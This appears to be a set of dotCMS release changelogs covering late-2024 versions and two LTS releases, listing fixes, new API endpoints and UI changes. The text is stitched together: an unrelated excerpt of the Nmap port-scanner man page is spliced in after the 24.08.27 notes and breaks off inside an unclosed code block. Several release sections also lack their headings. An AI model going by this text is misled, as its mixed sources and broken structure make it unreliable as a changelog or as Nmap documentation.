* The [Block Editor](block-editor) now does a better job generating hyperlinks linking to [URL-mapped content](slugs-and-url-maps-seo-friendly-urls), using the `urlTitle` field instead of an inode address. [[#26501](https://github.com/dotCMS/core/issues/26501)]
* The job queue processing loop no longer fails due to intermittent database connection timeouts. [[#30668](https://github.com/dotCMS/core/issues/30668)]
* It used to be possible to trigger a circularity when contentlets reference one another via both [relationship](relationships) fields and [Block Editor](block-editor) fields at the same time, which could lead to crashes due to excessive memory usage. Emphasis on “used to.” [[#30609](https://github.com/dotCMS/core/issues/30609)]
* A few fixes for the [UVE](universal-visual-editor):
  + Layout edits become visible immediately on Angular projects
  + Fixed the issue wherein browsing to layouts and back to the editor could fail to load, instead showing an infinite loading state. [[#30441](https://github.com/dotCMS/core/issues/30441)]
  + UVE no longer loses the page reference when creating a new language version of content with a different URL from the default language version. [[#30030](https://github.com/dotCMS/core/issues/30030)]
* [Vanity URL](vanity-urls) no longer encode `#` characters in URL targets, a behavior that struck us as poor for link integrity. [[#30130](https://github.com/dotCMS/core/issues/30130)]
* API calls to content or lists no longer automatically render widgets within, unless that behavior is explicitly requested with with the `render` parameter set to `true`; this prevents unintended execution of the content's code. [[#25523](https://github.com/dotCMS/core/issues/25523)]

### Security

* This update includes a security fix.

## dotCMS 24.11.25

##### Available: Nov 26, 2024 Demo starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241105/starter-20241105.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

**dotCMS 24.11.25** is packed to the gills with worthy improvements. This release brings you race-condition fixes and refactorings; it's got better labels and hints; it improves file transfers through the CLI, and media handling in the Block Editor. One hardly need add “and more,” and yet one has just done so.

In fact, there's also a subtle tension of anticipation just beneath the surface; even as you scan the healthy list of changes below, know that the draft document contains about *a third* more than this — reflecting contributions to features coming soon, including new faculties for system job queue management, content analytics, and content editing. Our developers, more than merely talented, are also *indefatigable*.

### Enhancements & Adjustments

* Refactored configuration property usage in content analytics and [dotAI](dotai) implementations, to ensure they can be reloaded via the system table without any inappropriate caching. [[#30673](https://github.com/dotCMS/core/issues/30673)]
* Improved the [JavaScript SDK](javascript-sdk)'s [client library readme](https://github.com/dotCMS/core/tree/main/core-web/libs/sdk/client#readme); now includes more examples and additional developer guidance in the use of the content API. [[#30614](https://github.com/dotCMS/core/issues/30614)]

### Fixes

* Improved the [experiment](experiments-and-a-b-testing) service endpoint to handle undefined IDs and HTTP error codes gracefully. [[#30652](https://github.com/dotCMS/core/issues/30652)]
* Restored inline editing of [Block Editor](block-editor) fields in the [Universal Visual Editor](universal-visual-editor) — in both headless and traditional implementations. [[#30607](https://github.com/dotCMS/core/issues/30607)] [[#28198](https://github.com/dotCMS/core/issues/28198)]
* Eliminated obsolete Elasticsearch commands and jobs; this resolves certain obscure errors and simplifies operations. [[#30468](https://github.com/dotCMS/core/issues/30468)]
* Resolved issues with incorrect [base type](base-content-types) assignments when transferring [content types](content-types) via [dotCLI](cli). [[#30438](https://github.com/dotCMS/core/issues/30438)]
* Addressed race conditions in [OSGi](about-osgi) plugin initialization, ensuring consistent [workflow actionlet](workflow-sub-actions) registration.
  [[#30291](https://github.com/dotCMS/core/issues/30291)]
* Added support for the `editContentlet` macro in the Universal Visual Editor for dynamic content editing. [[#30218](https://github.com/dotCMS/core/issues/30218)]
* Removed file size limits in dotCLI, allowing the transfer of files up to system-defined maximums. [[#30206](https://github.com/dotCMS/core/issues/30206)]
* When creating new content in a non-default language, image fields inside that content will correctly associate with the pertinent language. [[#29851](https://github.com/dotCMS/core/issues/29851)]
* Contentlets created on variants now save correctly, preventing several possible display and retention errors. [[#28799](https://github.com/dotCMS/core/issues/28799)]
* Dialog to add images or videos to Block Editor field now correctly opens on first click. [[#28741](https://github.com/dotCMS/core/issues/28741)]
* Visitor object no longer prints its `possiblePersonas` property by default; instead prints its `lastPersona`. [[#23823](https://github.com/dotCMS/core/issues/23823)]

## dotCMS 24.11.14

##### Available: Nov 15, 2024 Demo starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241105/starter-20241105.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

Fast on the heels of [24.11.11](changelogs#release-24.11.11), **dotCMS 24.11.14** floors it down the highway, hauling a trunk full of new API functionality — both standalone and intended for use with forthcoming features. Ready too roll, this hotrod's had a little bodywork, some under-the-hood tuneups, and even a fresh glow pouring from the undercarriage.

### Enhancements & Adjustments

* Added two new [locale](locales)-related endpoints. [[#30591](https://github.com/dotCMS/core/issues/30591)]
  + `GET /api/v1/content/{identifier}/languages` returns all locale objects, each containing a `translated` property whose value is a boolean indicating whether a version of the identified contentlet exists in that language.
  + `GET /api/v2/languages/_getdefault` returns the locale serving as the default language.
* The Workflow API endpoint `workflows/defaultactions/contenttype/{contentTypeId}` now includes in its returned entity the first [workflow step](managing-workflows#Steps) of the assigned default action. [[#30629](https://github.com/dotCMS/core/issues/30629)]
* Workflow API requests returning [workflow actions](managing-workflows#Actions) return two new boolean properties:
  + `hasCommentActionlet` indicates whether the workflow includes the “Comment on Workflow” [actionlet](workflow-sub-actions) [[#30571](https://github.com/dotCMS/core/issues/30571)]
  + `isResetable` indicates whether the workflow action contains a “Reset Workflow” actionlet [[#30541](https://github.com/dotCMS/core/issues/30541)]
* Added several endpoints for working with Workflow comments. While intended for management of activities in the forthcoming rebuilt contentlet editor, they can also be used headlessly. [[#30220](https://github.com/dotCMS/core/issues/30220)]
  + `POST /api/v1/workflow/{workflowTaskId}/comments` adds a new comment;
  + `GET /api/v1/workflow/tasks/history/comments/{commentId}` lists comments on a workflow task.

### Interface

* Fixed positioning of overlay dialog when relating content. [[#30053](https://github.com/dotCMS/core/issues/30053)]

### Fixes

* Fixed error in [Page API](page-rest-api-layout-as-a-service-laas) caching preventing some content from [[#30024](https://github.com/dotCMS/core/issues/30024)]
* `FileAssetContainers` are searchable in a case-insensitive fashion, mending an issue wherein they could only be located via lowercase queries. [[#30457](https://github.com/dotCMS/core/issues/30457)]
* Saving a currently active [site](multi-site-management) without hitting Save/Activate no longer causes the site to deactivate. [[#28362](https://github.com/dotCMS/core/issues/28362)]
* [Widgets](widgets) with a field named `url` no longer override its content with a default URL value. [[#27538](https://github.com/dotCMS/core/issues/27538)]
* Making changes to text elements inline in the [page editor](universal-visual-editor) — that is, directly and without clicking the pencil icon — correctly applies all changes, rather than only the last one before exiting. [[#27422](https://github.com/dotCMS/core/issues/27422)]

### Dependencies, Components, Etc.

* Updated `glowroot.jar` to version 0.14.2 and updated configuration of temp directory and logging behavior. [[#30024](https://github.com/dotCMS/core/issues/30024)]

## dotCMS 24.11.11

##### Available: Nov 11, 2024 Demo starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20241105/starter-20241105.zip) Empty starter image: [20241105](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20241105/starter-empty_20241105.zip)

From outside our construction site, the last few weeks probably seemed quiet. But inside, a raucous cacophony hammers body and soul — a dread opus of focused activity to make Carl Orff shudder. Indeed, before we dared open **dotCMS 24.11.11** to public traffic, we pulverized blockers with the jackhammers of the mind, and ground to smooth asphalt an array of bugs. QA steamrollers hummed along at all hours to a resounding Eroica of creativity and resolve. And along the way, we even added some pretty signage.

These smooth roads help the new features *pop* — including new endpoints concerning [workflow tasks](workflow-tasks) and content references, new [WYSIWYG field](the-wysiwyg-field) support for [language variables](global-language-variabes), a new [workflow sub-action](workflow-sub-actions) to reset content permissins, and upgraded JavaScript SDK documentation. We even included some optimizations under the hood, to boost the speed limit a little.

“Get out there and burn some rubber,” I'd say, were I not already standing in your cloud of rubber smoke. Well played.

### Enhancements & Adjustments

* [Angular JavaScript SDK](https://github.com/dotCMS/core/tree/master/core-web/libs/sdk/angular) documentation has been improved. [[#29212](https://github.com/dotCMS/core/issues/29212)]
* Added new Workflow API endpoint to retrieve [workflow tasks](workflow-tasks), including history and comments. [[#30519](https://github.com/dotCMS/core/issues/30519)]
* Added new Content API endpoints to retrieve the references to a given contentlet, either as a list or as a numeric count. [[#30477](https://github.com/dotCMS/core/issues/30477)]
* Content API responses will include the content's shortyId — a valid identifier not in strict UUID format. [[#30472](https://github.com/dotCMS/core/issues/30472)]
* New starters — both empty and equipped with the demo site — now include the [Locales Tool](locales) by default. [[#30297](https://github.com/dotCMS/core/issues/30297)]
  + Added a new upgrade task to likewise enable this tool on dotCMS system upgrade. [[#30296](https://github.com/dotCMS/core/issues/30296)]
* Added support for [language variables](global-language-variables) in [WYSIWYG fields](the-wysiwyg-field), including an insert field that displays the available translations in the current language version. [[#30222](https://github.com/dotCMS/core/issues/30222)]
* Added a new [workflow actionlet](workflow-sub-actions) capable of resetting content permissions in bulk. [[#28579](https://github.com/dotCMS/core/issues/28579)]

### Fixes

* React SDK project pages no longer crash when loading an empty container. [[#30496](https://github.com/dotCMS/core/issues/30496)]
* Angular SDK projects no longer throw 404 errors when trying to edit an unpublished page. [[#30440](https://github.com/dotCMS/core/issues/30440)]
* When dragging content not of the default language into a [UVE](universal-visual-editor) session, attempts to edit that contentlet will open its language version that aligns with the page language, rather than the default language version. (That's a lot of language-talk, but the important takeaway is that this is now working as intended.) [[#29095](https://github.com/dotCMS/core/issues/29095)]
* Uploaded file assets can no longer break [Page API](page-rest-api-layout-as-a-service-laas) calls by failing to serialize.[[#30464](https://github.com/dotCMS/core/issues/30464)]
* Content title property is no longer overwritten by the name of a file asset it contains. [[#30127](https://github.com/dotCMS/core/issues/30127)]
* Removed unnecessary cache synchronization on `TimedCacheProvider.get()` method to improve performance under load. [[#30528](https://github.com/dotCMS/core/issues/30528)]
* Removed legacy search command and search job; while important back in the days of fully embedded Elasticsearch, these components are only resulting in confusing errors in the context of the modern managed Opensearch environment. [[#30468](https://github.com/dotCMS/core/issues/30468)]
* Accessing the [dotAI Tool](dotai-tool) without a `SystemHost` App defined will no longer throw a stack overflow error. [[#30462](https://github.com/dotCMS/core/issues/30462)]
  > **Note:** This bullet originally appeared in the **dotCMS 24.10.25** changelog, but has since undergone additional refinement and QA review.
* Improved database validation methods for unique fields employed on saving or updating content. [[#30277](https://github.com/dotCMS/core/issues/30277)] [[#30279](https://github.com/dotCMS/core/issues/30279)]
* Removed log errors when the Visitor's Country [rule](rules) condition is unable to resolve to a country, which is the normal behavior for some types of requests. [[#30070](https://github.com/dotCMS/core/issues/30070)]
* Instances that migrated to Postgres from another database engine no longer exhibit intermittent and hard-to-replicate 404 errors. [[#30243](https://github.com/dotCMS/core/issues/30243)]
* When adding files via the content edit screen, dotCMS will still properly respect the default file asset type of the target folder. [[#30023](https://github.com/dotCMS/core/issues/30023)]
* Fixed issues preventing files from attaching correctly to — and remaining accessible from — [workflow tasks](workflow-tasks). [[#29238](https://github.com/dotCMS/core/issues/29238)]
* Redirect [rule](rules) no longer adds duplicate request parameters under some circumstances. [[#25178](https://github.com/dotCMS/core/issues/25178)]

## dotCMS 24.10.25

##### Available: Oct 28, 2024 Demo starter image: [20240807](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20240807/starter-20240807.zip) Empty starter image: [20240719](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20240719/starter-empty_20240719.zip)

Buon giorno and 你好! **dotCMS 24.10.25** carries greetings to all corners of this vast *mundus*, because this release introduces the new [**Locales Tool**](locales). Consisting of a language code joined to a country code, locales permit a fine-grained approach to internationalization — allowing, for instance, sub-specialization of language variables to account for regional dialects.

What if you're into [conlanging](https://en.wikipedia.org/wiki/Constructed_language)? Why, you can build in a fully custom locale, of course. Your options are broad and harmonious; سمن على عسل.

In addition, this release includes a new example headless project for those who like the Astro JavaScript framework; UI tweaks, including new LTS-end-of-life notifications; and the classic assortment of fixes.

Bon appétit!

* Saving or publishing [URL-mapped content](slugs-and-url-maps-seo-friendly-urls) in the [UVE](universal-visual-editor) no longer results in a redirect to the detail page of that content type. [[#29896](https://github.com/dotCMS/core/issues/29896)]
* Cursor position in the [Velocity Playground](velocity-playground) now properly aligns with text insert position. [[#30393](https://github.com/dotCMS/core/issues/30393)]
* [dotAI](dotai) chat-style searches have been updated to better handle the data stream in chunks irrespective of HTTP status evaluation. [[#30361](https://github.com/dotCMS/core/issues/30361)]

**dotCMS 24.10.16** arrives in the sector wearing the unmistakable uniform of the engineering corps over its lustrous exo-shell. “I am capable of performing a variety of maintenance tasks,” the android announces, and goes to work mending conduits. As exciting as it can be to explore the depths of a universe of content, interstellar passengers agree that ensuring the health of the vessel is at least a “top-three” priority.

This release adds a convenience feature to the ship's displays — Image fields can now conjure their content from a URL — and otherwise sticks to the humble work of confirming generator status as nominal, ensuring shields are not interfering with transporter beams, and stemming the occasional tribble infestation. These dutiful droids have included their work manifest below — dotting every i, as we say.

### Enhancements & Adjustments

* Added “Import from URL” option to Image Fields. [[#30061](https://github.com/dotCMS/core/issues/30061)]

* An upgrade task that carries dotCMS instances past version 23.01 has been adjusted to ensure the System Table is not queried before it has been created. [[#30336](https://github.com/dotCMS/core/issues/30336)]
* A new `unique_field` table has been created to validate values indicated within a content type as unique. [[#30275](https://github.com/dotCMS/core/issues/30275)]
* Due to a regression, all requests were briefly creating sessions; we have corrected this nutritional imbalance and brought the session population back into the range associated with a harmonious ecosystem. [[#30321](https://github.com/dotCMS/core/issues/30321)]
* Corrected a font size mismatch within the [WYSIWYG field](the-wysiwyg-field)'s plaintext view mode. [[#30254](https://github.com/dotCMS/core/issues/30254)]
* Autocomplete now works properly when assigning a class to [templates](designing-a-template-with-a-theme). [[#30249](https://github.com/dotCMS/core/issues/30249)]
* When calling members of the `childrenFolders` property of a host, `inode` sub-properties correctly return their inodes instead of identifiers. [[#29492](https://github.com/dotCMS/core/issues/29492)]
* CORS settings [for specific resources](cors-header-configuration#ResourceSpecificHeaders) now respect configured values. [[#26503](https://github.com/dotCMS/core/issues/26503)]

### Dependencies, Components, Etc.

* Removed Verdaccio as a dependency of Nx. [[#30252](https://github.com/dotCMS/core/issues/30252)]
* ClickHouse schemata have been integrated into the database migration tool set. [[#30229](https://github.com/dotCMS/core/issues/30229)]

## dotCMS 24.10.02

##### Available: Oct 3, 2024 Demo starter image: [20240807](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20240807/starter-20240807.zip) Empty starter image: [20240719](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20240719/starter-empty_20240719.zip)

**dotCMS 24.10.02** is a swirl of flavors that bilocate your taste buds in both the present and the future — featuring a mix of fixes in the here-and-now and groundwork for features yet to come.

On one hand, this release improves startup stability on large sites, [API Playground](api-playground) functionality, the [WYSIWYG field](the-wysiwyg-field) appearance, site copying, the [Content Palette](universal-visual-editor#ContentPalette), and more. On the other hand, we inch ever closer to a brand new content editor, new system-job management utilities, and the gradual movement of [Time Machine](time-machine) functionality into our [Universal Visual Editor](universal-visual-editor).

We think you'll enjoy what we're working on — whether now, later, or *both*.

### Enhancements & Adjustments

* The [Page API](page-rest-api-layout-as-a-service-laas) has been updated to better accommodate future changes that will take on more of the functionality of the deprecated [Time Machine](time-machine) feature. [[#30027](https://github.com/dotCMS/core/issues/30027)]
* Created PostgreSQL-based JobQueue interface to serve as the groundwork for forthcoming system job management utilities. [[#29479](https://github.com/dotCMS/core/issues/29479)]

### Fixes

* In the API Playground, Workflow API endpoints that return data as `application/octet-stream` no longer throw 406 errors. [[#30167](https://github.com/dotCMS/core/issues/30167)]
* Corrected several errors in the Workflow API `POST /v1/workflow/schemes/import` endpoint that caused incorrect schema display in the API Playground and incorrect error messages more generally. [[#29730](https://github.com/dotCMS/core/issues/29730)]
* Fixed concurrency limitations in the thread responsible for reindexing, thereby removing a cause of startup timeouts. [[#30083](https://github.com/dotCMS/core/issues/30083)]
* The JavaScript SDK now receives responses with the expected formatting from the Content API. [[#30136](https://github.com/dotCMS/core/issues/30136)]
* The [WYSIWYG field](the-wysiwyg-field)'s code mode and [ES Search tool](es-search-tool) now reflect the same value for the displayed text and cursor tracking. [[#29733](https://github.com/dotCMS/core/issues/29733)]
* The [Universal Visual Editor](universal-visual-editor)'s Content Palette is now correctly filtered according to what kinds of content the containers on a given page can hold. [[#30065](https://github.com/dotCMS/core/issues/30065)]
* Updating files with a size of `0` in [WebDAV](scripting-webdav) or [dotCLI](cli) no longer results in an error. [[#24042](https://github.com/dotCMS/core/issues/24042)]
* Including multiple [Block Editor](block-editor) fields in the same [content type](content-types) will no longer result in console errors that render the first editor nonfunctional. [[#30197](https://github.com/dotCMS/core/issues/30197)]
* When copying a site, many-to-one relationships will be properly maintained between parent and child content on different hosts. [[#29938](https://github.com/dotCMS/core/issues/29938)]
* Improved the error handling and messaging for validation failures on required fields. [[#23184](https://github.com/dotCMS/core/issues/23184)]
* Dependency references are now always listed in the `included by` column; the column value is no longer omitted in rows where the object is excluded from the bundle due to modification date. [[#28214](https://github.com/dotCMS/core/issues/28214)]

### Development Improvements

* The default core repository branch name has been changed from `master` to `main`. [[#29842](https://github.com/dotCMS/core/issues/29842)] [[#29841](https://github.com/dotCMS/core/issues/29841)]

## dotCMS 24.09.21

##### Available: Sep 23, 2024 Demo starter image: [20240807](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20240807/starter-20240807.zip) Empty starter image: [20240719](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20240719/starter-empty_20240719.zip)

**dotCMS 24.09.21** is truly a beast, and that it was an unusually long time coming is a measure of care in handling; a monster such as this warrants caution. For lo, past this iron maw beats a heart of fire, whispers a soul of scintillating starlights cast upon gilded peaks.

Nah, I kid; it's Java all the way down. But as I've been saying — or as *foretold in prophecy*, as my bluster would have it — dotCMS is now powered by **Java 21**, which brings with it a whole host of improvements: security, garbage collection, coding conventions, and more. Jumping ten whole major versions is bound to leave a mark.

This is also the first version of dotCMS to have **the [Universal Visual Editor (UVE)](universal-visual-editor) enabled as its page editor by default**. You've seen the docs, you've heard the hype, and now we invite you to immerse yourself in this pathbreaking paradigm!

You'll find many other items of note in this release, from easier personalization to the power to [edit configuration properties](configuration-properties#SystemTableUI) right from the admin panel; from removal of old figures and fields to better AI parameterization; from various interface fixes to *multifarious* bugs squashed.

I could waste more time summarizing, but seriously, take a look:

### Enhancements & Adjustments

* The [Universal Visual Editor](universal-visual-editor) is now enabled by default as the baseline page editor in dotCMS.
* The [system table](configuration-properties#SystemTable) feature can now be utilized directly from the **System -> Maintenance -> System Info** tab in the admin panel. [[#29793](https://github.com/dotCMS/core/issues/29793)]
* Personalization operations can now be conducted on the basis of persona `keyTag` values, rather than exclusively via identifiers. [[#29709](https://github.com/dotCMS/core/issues/29709)]
* Removed deprecated Permissions and Legacy Relationship fields from the content type builder's field selection menu. [[#29736](https://github.com/dotCMS/core/issues/29736)]
* **Dev Tools > Query Tool** now remembers the last query entered during the current session. [[#29520](https://github.com/dotCMS/core/issues/29520)]
* Added additional parameterization for [dotAI](dotai) to remove some hard-coding and better future-proof against an ever-changing slate of models and options. [[#28813](https://github.com/dotCMS/core/issues/28813)]
* Removed `systemLoadAverage` from the System Info host-statistic pane, as it is less suited to the modern, containerized paradigm. [[#28742](https://github.com/dotCMS/core/issues/28742)]
* Updated the default length of time for bundle cleanup deletions (via the `CLEANUP_BUNDLES_OLDER_THAN_DAYS` property) to 4 days, to better permit review on either side of a weekend. [[#29667](https://github.com/dotCMS/core/issues/29667)]
* Added additional logging to [push publishing](push-publishing) methods, which can be [enabled at the browser level](https://github.com/dotCMS/core/issues/29668#issuecomment-2322047467). [[#29668](https://github.com/dotCMS/core/issues/29668)]

### Interface

* Restored borders to dojo buttons. [[#25336](https://github.com/dotCMS/core/issues/25336)]

* Contentlets with an empty category field display the empty state properly. [[#29801](https://github.com/dotCMS/core/issues/29801)]
* Context menu overlays now close properly on execution. [[#29826](https://github.com/dotCMS/core/issues/29826)]
* When creating a new content type using the Page base type, the Cache TTL label correctly displays the units (seconds). [[#29708](https://github.com/dotCMS/core/issues/29708)]
* You know when the text of one field runs up over the text of another field, such that you can't read or interact optimally with either? Yeah, I hate that too. Anyway, we fixed that in our **Settings -> Configuration -> Basic Config** pane. [[#29619](https://github.com/dotCMS/core/issues/29619)]

  + Next.js example also no longer breaks on addition of an Event contentlet. [[#29768](https://github.com/dotCMS/core/issues/29768)]
* Also fixed inline editing for Angular projects. [[#28973](https://github.com/dotCMS/core/issues/28973)]
* Also fixed inline editing for React projects. We're on a roll, no? [[#28944](https://github.com/dotCMS/core/issues/28944)]

* Improved error messages for failed authentication in [JavaScript SDK](javascript-sdk)'s Angular example. [[#29738](https://github.com/dotCMS/core/issues/29738)]
* Fixed issue with the [JavaScript SDK client library](javascript-sdk-client-library) that would cause errors when used with Nextra. [[#29647](https://github.com/dotCMS/core/issues/29647)]
* Improved client library code documentation within GitHub. [[#29558](https://github.com/dotCMS/core/issues/29558)]

* [Layout editor](designing-a-template-with-a-theme) correctly adds classes to rows and boxes. [[#29935](https://github.com/dotCMS/core/issues/29935)]
* While we emphasize that support for [WebDAV](scripting-webdav) is deprecated in favor of the [dotCLI](cli), we couldn't just let the former sit broken; it's now working properly. [[#29882](https://github.com/dotCMS/core/issues/29882)]
* Adjusted startup probe methods to be more flexible and responsive when checking search nodes, making it less likely to throw unnecessary errors. [[#29719](https://github.com/dotCMS/core/issues/29719)]

* Modifying a template and push publishing it correctly updates the required tables on the receiving server, preventing page-breaking behaviors. [[#29148](https://github.com/dotCMS/core/issues/29148)]
* The Notify Assignee workflow sub-action occasionally threw an unexpected error. There's no excuse for an erroneous error; ergo, it's emended — even excised. [[#29214](https://github.com/dotCMS/core/issues/29214)]
* Bundle API now includes clearer messaging on deletion and on errors. [[#27782](https://github.com/dotCMS/core/issues/27782)]

## dotCMS 24.08.27

##### Available: Aug 28, 2024 Demo starter image: [20240807](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20240807/starter-20240807.zip) Empty starter image: [20240719](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20240719/starter-empty_20240719.zip)

**dotCMS 24.08.27** has useful new documentary elements, new dotParse functionality, more control over AI workflow operations, and more.

This release also introduces two small but significant — and, of course, necessary — breaking changes. We break to build, not vice versa, but growing pains are inevitable. These we soothe with the balm of an assortment of bugfixes.

To break with one hand and mend with another: Is this not the destiny of all humanity?

### Enhancements & Adjustments

* The half of the Workflow API endpoints have been documented in the [API Playground](api-playground); second half soon to follow! [[#29189](https://github.com/dotCMS/core/issues/29189)]
* API Playground documentation added for Authentication endpoints. [[#29616](https://github.com/dotCMS/core/issues/29616)]
* Removed automatic Save and Publish operations from [artificial intelligence](dotai) actionlets; better to leave those decisions to the user. [[#29387](https://github.com/dotCMS/core/issues/29387)]
* API endpoints now support invalid Java locales when performing operations on system languages. [[#28682](https://github.com/dotCMS/core/issues/28682)]
* Enhanced the [VTL parsing directive](include-of-a-vtl-or-html-file) to take a TTL as a second argument; this will automatically treat the parsed data as if enclosed in [a block cache](tag-based-caching-block-cache). [[#29144](https://github.com/dotCMS/core/issues/29144)]

### Interface

* Fixed a styling issue causing an unsightly bar to the left of the main window of the admin panel on Firefox. [[#29577](https://github.com/dotCMS/core/issues/29577)]
* Corrected the position of the user-account corner menu dropdown — home of the beloved [Login As](login-as) function. [[#29534](https://github.com/dotCMS/core/issues/29534)]
* Adjusted the colors on the calendar selector in [Experiments](experiments-and-a-b-testing). [[#29472](https://github.com/dotCMS/core/issues/29472)]
* Cache TTL field on page properties now specifies unit (seconds). [[#23074](https://github.com/dotCMS/core/issues/23074)]

### Fixes

* Repaired Copy URL button on [UVE](universal-visual-editor). [[#29570](https://github.com/dotCMS/core/issues/29570)]
* Fixed issue that could sometimes cause content to be deleted from a page after editing page properties. [[#29569](https://github.com/dotCMS/core/issues/29569)]
* Tag lengths now validate correctly in the content editor. [[#29559](https://github.com/dotCMS/core/issues/29559)]
* [Page tools](universal-visual-editor#NavPageTools) on the UVE now function as expected in both traditional and headless paradigms. [[#29206](https://github.com/dotCMS/core/issues/29206)]
* The [Template](templates) dropdown now reflects custom templates in the correct fashion. [[#29034](https://github.com/dotCMS/core/issues/29034)]
* [Push publishing](push-publishing) content no longer fails in the case where system-host content uses a tag on another host and attempts to push to a receiver that lacks this tag — rectifying what might be thought of as a lateral blind spot. [[#29397](https://github.com/dotCMS/core/issues/29397)]
* Images no longer disappear from a page when a retrieved as related content in the same Page API call. [[#29259](https://github.com/dotCMS/core/issues/29259)]
* Host lookups now cache their results even if no site is found. [[#27366](https://github.com/dotCMS/core/issues/27366)]

### Development Improvements

* Fixed Docker Compose example for push-publishing environments. [[#25595](https://github.com/dotCMS/core/issues/25595)]

### Breaking Changes

* Created a global log4j configuration in Tomcat. This may cause conflicts with existing custom logging behaviors; in the worst case can cause a server to fail to start. Using the default logging configuration is recommended when upgrading. [[#23631](https://github.com/dotCMS/core/issues/23631)]
* [Page API](page-rest-api-layout-as-a-service-laas)'s returned image property now includes the entire image object, rather than just an identifier string. [[#29259](https://github.com/dotCMS/core/issues/29259)]

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

## LTS dotCMS releases

dotCMS will periodically specify specific product releases as **Long-Term Supported (LTS)** releases, which will be maintained for a longer period than other dotCMS releases, and which will provide a number of advantages for customers that choose to install them.

dotCMS is committed to the security and stability of our latest LTS versions. In our ongoing efforts to protect users, we have established [specific timelines for resolving detected vulnerabilities](responsible-disclosure-policy#ApproximateTimetable). Note that the responsibility outlined here concerns vulnerabilities that are relevant to live, supported versions. Users on current LTS versions will benefit from security updates in accordance with our established schedules.

Please see the [Long Term Supported Releases page](/docs/latest/lts) for more information and [Current Releases](/docs/latest/current-releases) for downloads.

## dotCMS 22.03.15 [LTS](/docs/latest/lts)

##### Available: Apr 15, 2024 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Fixes

* Scaled back some excessively verbose log entries. [[#27910](https://github.com/dotCMS/core/issues/27910)]
* Corrected role checks when requiring multiple roles to access a resource. [[#27909](https://github.com/dotCMS/core/issues/27909)]

### Dependencies, Components, Etc.

* Updated Postgres JDBC driver. The vulnerability this update resolves did not affect dotCMS, as we do not use the setting in question. Still, automated scans that don't know any better were very noisy about this. So… we may as well. [[#27894](https://github.com/dotCMS/core/issues/27894)]

### Security

* Patched two medium security issues.

## dotCMS 22.03.14 [LTS](/docs/latest/lts)

##### Available: Jan 22, 2024 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Reserved names are now evaluated in case-insensitive fashion, for improved consistency. [[#26796](https://github.com/dotCMS/core/issues/26796)]

### Fixes

* Publish Date parameter no longer prevents the scheduled content from being exported. [[#27007](https://github.com/dotCMS/core/issues/27007)]
  + Also fixes a related issue that prevents export while filtering by a large number of categories.
* Removed the 255-character limit on the validation of text fields; this was likely to affect, for instance, [Vanity URLs](vanity-urls) with very long addresses. [[#26774](https://github.com/dotCMS/core/issues/26774)]
* The presence of a non-required Site/Folder field in a Content Type no longer causes duplication of contentlets of that type to fail. [[#26459](https://github.com/dotCMS/core/issues/26459)]
* Relationship fields now respect and reflect the order in which related contentlets are received via Workflow Action. [[#26439](https://github.com/dotCMS/core/issues/26439)]
